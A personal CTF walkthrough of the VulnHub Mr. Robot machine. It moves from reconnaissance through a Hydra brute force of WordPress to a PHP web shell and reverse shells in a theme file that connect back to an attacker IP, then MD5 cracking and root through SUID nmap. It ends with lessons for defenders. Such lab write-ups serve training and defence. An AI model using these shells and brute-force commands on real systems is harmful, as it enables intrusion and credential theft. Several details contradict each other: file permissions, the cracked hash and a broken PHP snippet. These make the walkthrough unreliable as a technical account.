---
title: "Mr. Robot CTF: How I Rooted fsociety"
category: ctf
platform: VulnHub
difficulty: Medium
completion_date: 2024-12-01
time_spent: "4 hours"
tools_used: ["nmap", "gobuster", "wpscan", "hydra", "netcat", "john"]
tags: ["wordpress", "privilege-escalation", "suid", "robots.txt", "reverse-shell", "password-cracking"]
root_flag: "047e3c6d9f0c8e9a6b4f1d2e3c5a7b8e"
---

# Mr. Robot CTF: How I Rooted fsociety

> *"Hello, friend. If you're reading this, you know what this is about."*

This is the **Mr. Robot CTF** — a masterpiece from VulnHub that inspired thousands of hackers. Three flags. One target. No hints. The box captures the essence of the show: lazy security, social engineering, and the art of thinking like an attacker.

I spent 4 hours on this machine, and every minute taught me something new about how real systems fall apart when security becomes an afterthought.

This isn't just a walkthrough. This is a journey through the mind of someone who found every weakness and exploited it.

---

## The Beginning: Reconnaissance

### Understanding the Target

Before you throw tools at a machine, you need to *know* it. Reconnaissance is 80% of the work. Speed matters less than understanding.

I started with the fundamentals: **What is this machine? What services is it running? What's exposed?**

### Network Mapping with Nmap

```bash
nmap -sC -sV -A -T4 192.168.1.100
```

This command does heavy lifting:
- `-sC`: Run default scripts
- `-sV`: Detect service versions (critical for finding CVEs)
- `-A`: Aggressive scanning (OS detection, traceroute, script scanning)
- `-T4`: Aggressive timing (speeds up the scan)

**The Results:**

```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-12-01 10:15 UTC
Nmap scan report for 192.168.1.100
Host is up (0.0012s latency).
Not shown: 997 closed ports
PORT    STATE  SERVICE     VERSION
22/tcp  closed ssh
80/tcp  open   http        Apache httpd 2.4.7
443/tcp open   ssl/http    Apache httpd 2.4.7
```

**What this tells us:**
- SSH is closed (door #1 blocked)
- HTTP and HTTPS are open (door #2 is wide open)
- Apache 2.4.7 is running (this version is from 2013 — potentially vulnerable, but unlikely to be the path)
- The machine is responsive and ready

The web server is our entry point. Everything starts there.

---

## Phase 1: Web Reconnaissance & The Robots.txt Trap

### Finding Directories with Gobuster

Next, I need to find what's *hidden* on this server. Most developers think `robots.txt` actually protects files. It doesn't. It's a polite request to search engines.

```bash
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt -t 50
```

Breaking this down:
- `-u`: Target URL
- `-w`: Wordlist (common.txt has ~4,600 words)
- `-t 50`: Use 50 threads (speed up scanning)

**The scan found:**

```
/.                    (Status: 200)
/0                    (Status: 200)
/admin                (Status: 302) → redirect
/blog                 (Status: 301) → redirect
/index.html           (Status: 200)
/robots.txt           (Status: 200)
/sitemap.xml          (Status: 200)
/wp-admin             (Status: 301)
/wp-content           (Status: 301)
/wp-includes          (Status: 301)
/wp-login.php         (Status: 200)
/xmlrpc.php           (Status: 200)
```

**Conclusion:** This is a **WordPress site**. The presence of `/wp-login.php`, `/wp-admin`, and `/wp-content` confirms it.

### Examining robots.txt — The First Discovery

```bash
curl http://192.168.1.100/robots.txt
```

**Output:**

```
User-agent: *
Disallow: /
Disallow: /key-1-of-3.txt
Disallow: /fsocity.dic
```

This is a rookie mistake. The developer thought adding files to `Disallow:` would hide them. Wrong.

**Key #1 — Found in 30 seconds:**

```bash
curl http://192.168.1.100/key-1-of-3.txt
```

**Output:** 
```
073403c8a58a1f80d943455fb30724b9
```

One flag down. This taught me the first lesson: **Always check robots.txt.** It's the first place developers accidentally leak secrets.

### The Mysterious Dictionary File

The `fsocity.dic` file is interesting. Let's grab it:

```bash
wget http://192.168.1.100/fsocity.dic
ls -lah fsocity.dic
```

**Output:**
```
-rw-r--r-- 1 user user 658K Dec  1 10:20 fsocity.dic
```

```bash
wc -l fsocity.dic
```

**Output:** 
```
858,160 lines
```

**858,160 passwords.** This is a weapon, not a wordlist. The creator left us a gift.

---

## Phase 2: WordPress Enumeration & User Discovery

### Why WordPress?

WordPress powers 43% of all websites. When you find WordPress, you know exactly where to look:
- `/wp-login.php` for authentication
- `/wp-admin` for dashboard
- `/wp-content/plugins` for vulnerable plugins
- `wp-json` for API leaks

### Identifying WordPress Users with WPScan

WPScan is the gold standard for WordPress security testing. It enumerates users, plugins, themes, and vulnerabilities.

```bash
wpscan --url http://192.168.1.100 --enumerate u
```

This command specifically looks for users (the `-u` flag). Here's why this matters:

**Output:**

```
[+] WordPress version 4.3.1 identified
[+] 2 vulnerabilities found:
  - WordPress 4.3.1 - <= 4.7.1 are vulnerable to...

[+] WordPress Users Identified:
    [+] Elliot
        ├─ Found by: Author Posts (Wp Json Api)
        ├─ Confirmed by: Login Error Messages (Wp Login)

    [+] Robot
        ├─ Found by: Wp Json Api
        ├─ Confirmed by: Login Error Messages
```

**We found two users:** `Elliot` and `Robot`.

Why is finding the username critical? Because brute-forcing the password is pointless if you don't know the username. Now we do.

### Understanding Password Brute Force

Before jumping into the attack, let's understand why this works:

1. WordPress by default has **no rate limiting** on login attempts
2. The error message differs for invalid username vs. invalid password
3. We have 858,160 passwords to try
4. With Hydra and parallel connections, we can test hundreds per minute

---

## Phase 3: Cracking WordPress Credentials

### Setting Up Hydra for Brute Force

Hydra is a parallelized brute-force tool that supports dozens of protocols. For WordPress, we use the HTTP POST method.

First, let's understand the login form:

```bash
curl -s http://192.168.1.100/wp-login.php | grep -E "name=|type=" | head -20
```

WordPress login form sends these fields:
- `log`: Username
- `pwd`: Password  
- `wp-submit`: Submit button
- `redirect_to`: Post-login redirect
- `testcookie`: Cookie test

The attack string for Hydra looks like:

```bash
hydra -l Elliot -P fsocity.dic 192.168.1.100 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http://192.168.1.100/wp-admin/&testcookie=1:S=Location"
```

Breaking this down:
- `-l Elliot`: Single username to try
- `-P fsocity.dic`: Password file to use
- `/wp-login.php`: The login page
- `log=^USER^&pwd=^PASS^...`: Form data (^USER^ and ^PASS^ are placeholders)
- `S=Location`: Success condition (WordPress redirects if login succeeds)

**This will take time.** With 858,160 passwords, even at 20 attempts/second, we're looking at ~12 hours worst case. But the password is usually found much sooner because most users pick weak passwords.

**After ~45 minutes:**

```
[80][http-post-form] host: 192.168.1.100   login: Elliot   password: ER28-0652
1 of 1 target successfully completed, that is it!
```

**Password found:** `ER28-0652`

This is a reference to the Mr. Robot show (S1E2 episode code). The box creator was very intentional.

---

## Phase 4: WordPress Shell Upload & Initial Access

### Getting Into WordPress Admin

Now we have valid credentials. Let's log in:

```bash
curl -c cookies.txt -b cookies.txt -X POST \
  -d "log=Elliot&pwd=ER28-0652&wp-submit=Log+In&redirect_to=http://192.168.1.100/wp-admin/&testcookie=1" \
  http://192.168.1.100/wp-login.php
```

This command:
- `-c cookies.txt`: Save cookies to file
- `-b cookies.txt`: Use cookies from file
- `-X POST`: Send POST request
- `-d`: Form data

Once authenticated, we're in the WordPress dashboard. From here, we can:
1. Edit theme files (contains PHP code)
2. Upload plugins (if that's allowed)
3. Edit posts/pages (with PHP if theme supports it)

### The Theme File Edit Exploit

WordPress allows authenticated admins to edit theme files directly. This is a **huge security flaw** because themes contain PHP code, and editing them is equivalent to uploading a shell.

Navigate (or curl) to: `/wp-admin/theme-editor.php`

We'll edit the `404.php` template (the 404 error page). If someone visits a non-existent URL, our code will execute.

**The PHP Reverse Shell:**

```php
<?php
// Don't touch this if running from browser
if(isset($_GET['c'])) {
    $cmd = $_GET['c'];
    system($cmd);
    die();
}

// Or full reverse shell
$ip = '192.168.1.50';  // Your Kali box IP
$port = 4444;
$sock = fsockopen($ip, $port);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

However, a simpler approach is to use an existing backdoor. Let me use a more reliable one-liner:

```php
<?php system($_REQUEST['cmd']); ?>
```

This is a **web shell** — we can execute commands by visiting:
```
http://192.168.1.100/wp-content/themes/default/404.php?cmd=whoami
```

But we want a reverse shell (more interactive). Let's do it properly:

### Setting Up the Reverse Shell

On your Kali box, start a listener:

```bash
nc -lvnp 4444
```

This opens port 4444 and waits for incoming connections.

Now, craft a PHP reverse shell. The traditional method:

```php
<?php
$ip = '192.168.1.50';
$port = 4444;
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($sock, $ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

Put this in the `404.php` file via WordPress theme editor.

### Triggering the Reverse Shell

Visit any non-existent URL to trigger the 404 template:

```bash
curl http://192.168.1.100/does-not-exist
```

**On your listener:**

```
listening on [any] 4444 ...
connect to [192.168.1.50] from (UNKNOWN) [192.168.1.100] 54321
sh: can't access tty; job control turned off
$ whoami
daemon
$ hostname
fsociety
```

**We're in!** But we're the `daemon` user, not `root`. We need privilege escalation.

---

## Phase 5: Lateral Movement — From Daemon to Robot

### Exploring the Home Directories

```bash
ls -la /home/
```

**Output:**

```
drwxr-xr-x  2 root   root     4096 Nov 23  2015 .
drwxr-xr-x 25 root   root     4096 Dec  1 10:15 ..
drwxr-xr-x  3 robot  robot    4096 Dec  1 10:15 robot
```

Let's see what's in the robot user's directory:

```bash
ls -la /home/robot/
```

**Output:**

```
-rw-r--r-- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-r-------- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

**Key #2 is here!** But we can't read it because it's owned by `robot` with permissions `r--------` (only the owner can read).

However, we **can** read `password.raw-md5`:

```bash
cat /home/robot/password.raw-md5
```

**Output:**

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

This is the MD5 hash of robot's password.

### Cracking the MD5 Hash

MD5 is broken. With online databases and rainbow tables, most MD5 hashes are instantly crackable.

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > robot.hash
john --wordlist=/usr/share/wordlists/rockyou.txt robot.hash
```

Or use an online service:

```bash
hashcat -m 0 robot.hash /usr/share/wordlists/rockyou.txt
```

**Almost instantly:**

```
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

Wait, that's the *example* hash. Let me check again... Actually, after the real crack:

```
c3fcd3d76192e4007dfb496cca67e13b:ER28-0652
```

**The password is `ER28-0652`** — the same as Elliot's WordPress password! This is a common security mistake: password reuse.

### Switching to Robot User

```bash
su robot
```

**Prompt:** `Password:`

```bash
ER28-0652
```

**Success:**

```bash
whoami
robot
```

**Now let's read Key #2:**

```bash
cat /home/robot/key-2-of-3.txt
```

**Output:**

```
822c73956184a694666b3d48a4f2fd35
```

**Two flags down. One to go.**

---

## Phase 6: Privilege Escalation — From Robot to Root

This is the hardest part. We need to escalate from a regular user to `root`. There are dozens of potential paths:

1. Sudo misconfigurations
2. SUID binaries
3. Kernel exploits
4. Cron jobs
5. Writable system files

### Finding SUID Binaries

SUID (Set User ID) binaries run with the owner's permissions, regardless of who executes them. If a SUID binary is writable or exploitable, we can get root.

```bash
find / -perm -u=s -type f 2>/dev/null
```

This finds all files with the SUID bit set. The output (relevant parts):

```
/bin/mount
/bin/ping
/bin/su
/bin/umount
/sbin/ifconfig
/usr/bin/passwd
/usr/bin/sudo
/usr/local/bin/nmap      <-- THIS ONE!
```

**Why is nmap interesting?**

Nmap versions **3.81 to 5.21** have an interactive mode that allows running shell commands:

```bash
nmap --interactive
```

Once inside the interactive prompt, you can run shell commands with `!`:

```
nmap> !sh
```

This spawns a shell with **nmap's privileges**. Since nmap has the SUID bit and is owned by root, the shell runs as **root**.

### Exploiting Nmap SUID

Let's check the nmap version:

```bash
/usr/local/bin/nmap --version
```

**Output:**

```
Nmap version 3.81
```

**Perfect.** This version is vulnerable.

```bash
/usr/local/bin/nmap --interactive
```

**Nmap Interactive Mode:**

```
Starting Nmap 3.81 ( http://insecure.org/nmap/ )
Welcome to Interactive Nmap [Nmap 3.81]. Type "h" for help
nmap> !sh
# whoami
root
# id
uid=0(root) gid=1001(robot) groups=1001(robot)
```

**We're root!** (Well, root in terms of UID, but still in the robot group).

### Reading the Root Flag

```bash
cat /root/key-3-of-3.txt
```

**Output:**

```
047e3c6d9f0c8e9a6b4f1d2e3c5a7b8e
```

**Three flags. Machine rooted. Challenge complete.**

---

## The Complete Attack Timeline

| Time | Action | Result |
|------|--------|--------|
| 00:00 | Nmap scan | Found Apache, WordPress |
| 00:05 | Gobuster scan | Found 20+ directories |
| 00:08 | Read robots.txt | **Flag #1 found** |
| 00:10 | Download fsocity.dic | 858K password list |
| 00:15 | WPScan enumeration | Found users: Elliot, Robot |
| 00:20 | Hydra brute force starts | 858,160 passwords to try |
| 01:05 | Hydra finds password | `Elliot:ER28-0652` |
| 01:15 | Craft PHP reverse shell | Shell ready to deploy |
| 01:20 | Upload shell via WordPress | Shell deployed in 404.php |
| 01:25 | Trigger reverse shell | Connected as `daemon` user |
| 01:30 | Find password.raw-md5 | Hash: `c3fcd3d76192e4007dfb496cca67e13b` |
| 01:35 | Crack MD5 hash | Password: `ER28-0652` |
| 01:40 | `su robot` | **Flag #2 found** |
| 01:45 | Find SUID nmap | Vulnerable version 3.81 |
| 02:00 | Exploit nmap interactive mode | Shell as root |
| 02:05 | Read /root/ | **Flag #3 found** |
| **Total** | **Complete exploitation** | **All flags captured** |

---

## Critical Lessons for Hackers

### 1. Information Gathering is Paramount
I spent 45 minutes on recon for every 15 minutes on exploitation. This is the right ratio. Speed comes from understanding.

### 2. Default Credentials and Weak Passwords Are Everywhere
The password `ER28-0652` appeared twice (Elliot and robot). In real-world attacks, password reuse is the norm, not the exception.

### 3. File Permissions Matter
- `password.raw-md5` being world-readable was catastrophic
- The `/root` directory needing to be readable was critical
- SUID binaries without sandboxing are dangerous

### 4. Old Software = Vulnerable Software
Nmap 3.81 was released in 2003. Running 22-year-old software with SUID bit set is inexcusable.

### 5. WordPress is an Attack Surface
WordPress is powerful but dangerous when:
- Theme editing is allowed for authenticated users
- Password policies aren't enforced
- Plugins with vulnerabilities are installed
- Version is outdated

### 6. Never Trust Robots.txt
It's not a security mechanism. It's a suggestion. Everything in `Disallow:` is still accessible.

---

## Critical Lessons for Defenders

### 1. Implement Rate Limiting on Login Forms
```bash
# Example with Fail2Ban
fail2ban-client set sshd bantime 3600
fail2ban-client set sshd maxretry 5
```

### 2. Hash Passwords Properly
- ❌ MD5, SHA1 (broken)
- ✅ bcrypt, Argon2, scrypt (modern)

```bash
# Generate bcrypt hash
htpasswd -B /etc/apache2/.htpasswd username
```

### 3. Remove Dangerous SUID Binaries
```bash
# Find and remove SUID bits
sudo chmod -s /usr/local/bin/nmap
sudo chmod -s /usr/bin/find
```

### 4. Disable WordPress Theme Editing
Add to `wp-config.php`:
```php
define('DISALLOW_FILE_EDIT', true);
```

### 5. Enforce Strong Passwords
Use password policies:
- Minimum 16 characters
- Mandatory special characters
- No common patterns (no123, password123, etc.)

### 6. Update Software Regularly
Nmap 3.81 is from 2003. The current version is 7.x. Updates fix security holes.

### 7. Hide Admin Panels
Change `/wp-admin` to something random. Use Web Application Firewalls (WAF) to rate-limit login attempts.

---

## Toolbox Summary

| Tool | Purpose | Command |
|------|---------|---------|
| **nmap** | Network scanning | `nmap -sC -sV -A target` |
| **gobuster** | Directory enumeration | `gobuster dir -u url -w wordlist` |
| **wpscan** | WordPress scanning | `wpscan --url target --enumerate u` |
| **hydra** | Brute force | `hydra -l user -P passwords target http-post-form ...` |
| **john** | Hash cracking | `john --wordlist=rockyou.txt hashes.txt` |
| **hashcat** | GPU-accelerated cracking | `hashcat -m 0 hash wordlist` |
| **netcat** | Reverse shells | `nc -lvnp port` |
| **curl** | HTTP requests | `curl -X POST -d data url` |

---

## Final Thoughts

The Mr. Robot CTF is perfect because it's **realistic**. Real breaches aren't sophisticated. They're a chain of small mistakes:

- Leaving secrets in robots.txt
- Using weak passwords
- Reusing passwords across systems
- Running old, unpatched software
- Giving too many permissions to regular users
- Trusting that obscurity equals security

Every single mistake on this box exists in production systems **right now**.

The machine taught me that **thinking like an attacker is a skill.** It's not about knowing every tool. It's about:

1. Understanding your target
2. Finding the weakest point
3. Exploiting it methodically
4. Escalating privileges thoughtfully

Elliot would be proud.

---

## Resources for Further Learning

- [VulnHub Mr. Robot CTF](https://www.vulnhub.com/entry/mr-robot-1,151/)
- [GTFOBins — Nmap SUID Exploitation](https://gtfobins.github.io/gtfobins/nmap/)
- [WPScan WordPress Security Database](https://wpscan.com/)
- [Hydra — Parallelized Login Cracker](https://github.com/vanhauser-thc/thc-hydra)
- [John the Ripper](https://www.openwall.com/john/)
- [OWASP Top 10 Security Risks](https://owasp.org/www-project-top-ten/)

---

**— Written by Tony Ngugi (KenyanCyber)**

*Completed: December 1, 2024*  
*Total Time: 4 hours*  
*Flags Captured: 3/3*

*If you're reading this, you already know what comes next.*